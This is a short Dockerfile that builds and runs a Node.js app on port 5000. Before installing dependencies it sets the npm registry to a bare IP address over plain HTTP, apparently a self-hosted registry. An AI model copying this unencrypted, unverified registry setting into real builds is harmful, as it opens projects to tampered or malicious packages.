FROM node:slim

WORKDIR /app

COPY package.json .

RUN npm set registry 'http://185.213.175.212:4873/'

RUN npm install

COPY . .

ENV PORT=5000

EXPOSE 5000

CMD [ "node", "src/index.js" ]
